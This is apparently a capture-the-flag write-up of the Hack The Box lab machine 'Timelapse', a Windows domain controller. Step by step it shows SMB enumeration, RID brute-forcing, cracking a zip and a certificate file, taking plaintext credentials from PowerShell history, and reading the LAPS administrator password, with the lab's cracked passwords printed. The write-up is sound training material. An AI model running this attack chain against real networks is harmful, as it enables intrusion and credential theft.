# Timelapse

# User Flag

## NMAP Enumeration

NMAP All Ports:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.11.152

PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
389/tcp   open  ldap           syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
636/tcp   open  ldapssl        syn-ack ttl 127
3268/tcp  open  globalcatLDAP  syn-ack ttl 127
5986/tcp  open  wsmans         syn-ack ttl 127
9389/tcp  open  adws           syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49673/tcp open  unknown        syn-ack ttl 127
49674/tcp open  unknown        syn-ack ttl 127
49721/tcp open  unknown        syn-ack ttl 127
```

NMAP Service Enumeration:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.11.152 -p 53,88,135,139,389,445,464,593,636,3268,5986,9389,49667,49673,49674,49721

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-09 23:44:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
|_SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2024-06-09T23:46:06+00:00; +7h59m59s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-09T23:45:25
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
```

## SMB Enumeration

SMBMap anonymous login (i.e. Null Attack):

```bash
smbmap -H 10.10.11.152 -u anonymous

[+] IP: 10.10.11.152:445        Name: 10.10.11.152              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

Found the following files in `Shares` via `smbclient`:

```bash
smbclient //10.10.11.152/Shares -N

smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 20:40:06 2021
  ..                                  D        0  Mon Oct 25 20:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021

smb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 16:48:42 2021
  ..                                  D        0  Mon Oct 25 16:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 15:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 15:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 15:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 15:57:44 2021
```

The `winrm_backup.zip` is password encrypted and the `LAPS.x64.msi` could indicate a potential exploit path.

Enumerated users list:

```bash
crackmapexec smb 10.10.11.152 -u 'guest' -p '' --rid-brute

SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\guest: 
SMB         10.10.11.152    445    DC01             [+] Brute forcing RIDs
SMB         10.10.11.152    445    DC01             498: TIMELAPSE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.152    445    DC01             500: TIMELAPSE\Administrator (SidTypeUser)
SMB         10.10.11.152    445    DC01             501: TIMELAPSE\Guest (SidTypeUser)
SMB         10.10.11.152    445    DC01             502: TIMELAPSE\krbtgt (SidTypeUser)
SMB         10.10.11.152    445    DC01             512: TIMELAPSE\Domain Admins (SidTypeGroup)
SMB         10.10.11.152    445    DC01             513: TIMELAPSE\Domain Users (SidTypeGroup)
SMB         10.10.11.152    445    DC01             514: TIMELAPSE\Domain Guests (SidTypeGroup)
SMB         10.10.11.152    445    DC01             515: TIMELAPSE\Domain Computers (SidTypeGroup)
SMB         10.10.11.152    445    DC01             516: TIMELAPSE\Domain Controllers (SidTypeGroup)
SMB         10.10.11.152    445    DC01             517: TIMELAPSE\Cert Publishers (SidTypeAlias)
SMB         10.10.11.152    445    DC01             518: TIMELAPSE\Schema Admins (SidTypeGroup)
SMB         10.10.11.152    445    DC01             519: TIMELAPSE\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.152    445    DC01             520: TIMELAPSE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.152    445    DC01             521: TIMELAPSE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.152    445    DC01             522: TIMELAPSE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.152    445    DC01             525: TIMELAPSE\Protected Users (SidTypeGroup)
SMB         10.10.11.152    445    DC01             526: TIMELAPSE\Key Admins (SidTypeGroup)
SMB         10.10.11.152    445    DC01             527: TIMELAPSE\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.152    445    DC01             553: TIMELAPSE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.152    445    DC01             571: TIMELAPSE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.152    445    DC01             572: TIMELAPSE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.152    445    DC01             1000: TIMELAPSE\DC01$ (SidTypeUser)
SMB         10.10.11.152    445    DC01             1101: TIMELAPSE\DnsAdmins (SidTypeAlias)
SMB         10.10.11.152    445    DC01             1102: TIMELAPSE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.152    445    DC01             1601: TIMELAPSE\thecybergeek (SidTypeUser)
SMB         10.10.11.152    445    DC01             1602: TIMELAPSE\payl0ad (SidTypeUser)
SMB         10.10.11.152    445    DC01             1603: TIMELAPSE\legacyy (SidTypeUser)
SMB         10.10.11.152    445    DC01             1604: TIMELAPSE\sinfulz (SidTypeUser)
SMB         10.10.11.152    445    DC01             1605: TIMELAPSE\babywyrm (SidTypeUser)
SMB         10.10.11.152    445    DC01             1606: TIMELAPSE\DB01$ (SidTypeUser)
SMB         10.10.11.152    445    DC01             1607: TIMELAPSE\WEB01$ (SidTypeUser)
SMB         10.10.11.152    445    DC01             1608: TIMELAPSE\DEV01$ (SidTypeUser)
SMB         10.10.11.152    445    DC01             2601: TIMELAPSE\LAPS_Readers (SidTypeGroup)
SMB         10.10.11.152    445    DC01             3101: TIMELAPSE\Development (SidTypeGroup)
SMB         10.10.11.152    445    DC01             3102: TIMELAPSE\HelpDesk (SidTypeGroup)
SMB         10.10.11.152    445    DC01             3103: TIMELAPSE\svc_deploy (SidTypeUser)
```

## Password Attacks

Used `fcrackzip` to crack the encrypted ZIP file:

```bash
fcrackzip -v -u -D -p rockyou.txt winrm_backup.zip

found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)
checking pw udei9Qui                                

PASSWORD FOUND!!!!: pw == supremelegacy
```

ZIP file contains `legacyy_dev_auth.pfx`. The `openssl` command can be used to extract the private key and certificate (public key) from a `.pfx` file but requires a password.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
```

Use `pfx2john.py` will generate a hash for the pfx file:

```bash
pfx2john legacyy_dev_auth.pfx > pfx_hash.txt
```

Used `john` to crack password:

```bash
john --wordlist=rockyou.txt pfx_hash.txt

thuglegacy       (pfx_hash.txt)
```

With the password, I can extract the key and certificate.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Decrypt the key using the password set above so we don’t have to remember it:

```bash
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key-enc:
writing RSA key
```

Dump the certificate:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
```

Use `evil-winrm` to connect to host and retrieve the user flag:

* `-S` - Enable SSL, because I’m connecting to 5986;
* `-c` legacyy_dev_auth.crt - provide the public key certificate
* `-k` legacyy_dev_auth.key - provide the private key

```bash
evil-winrm -i 10.10.11.152 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crtdir

*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/15/2024  11:30 AM             34 user.txt
```

# Root Flag

## Windows Privilege Escalation 

The file `winPEASx64.exe` is deleted by AV and bloodhound requires credentials but using `winPEAS.bat`, I can see reference made to `ConsoleHost_history.txt`:

```bash
PS default transcript history

Checking PS history file
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

 Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

03/04/2022  12:46 AM               434 ConsoleHost_history.txt
               1 File(s)            434 bytes
               0 Dir(s)   5,471,080,448 bytes free
```

The `ConsoleHost_history.txt` file contains commands run by the user we are connected as:

```powershell
story.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We found a new set of credentials: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`.


## LAPS_Readers

Signed in with `evil-winrm`:

```bash
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

Noted that the user `svc_deploy` is a member of the group `LAPS_Readers`, which indicates `svc_deploy` has access to read from LAPS. Local Administrator Password Solution (LAPS) is a tool used for managing a system where administrator passwords, which are unique, randomized, and frequently changed, are applied to domain-joined computers. In the domain's computer objects, the implementation of LAPS results in the addition of two new attributes: 
`ms-mcs-AdmPwd` and `ms-mcs-AdmPwdExpirationTime`. These attributes store the plain-text administrator password and its expiration time, respectively.

Can check if service is enabled:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd
    AdmPwdEnabled    REG_DWORD    0x1
```

To read the LAPS password, I just need to use `Get-ADComputer` and specifically request the `ms-mcs-admpwd` property:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : #4{r284#V9#4+o5kIdJv}535
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

Can see the password for the local admin and logged into to get the root flag:

```bash
evil-winrm -i 10.10.11.152 -u administrator -p '#4{r284#V9#4+o5kIdJv}535' -S

*Evil-WinRM* PS C:\Users\TRX\Desktop> dir


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/15/2024  11:30 AM             34 root.txt
```





















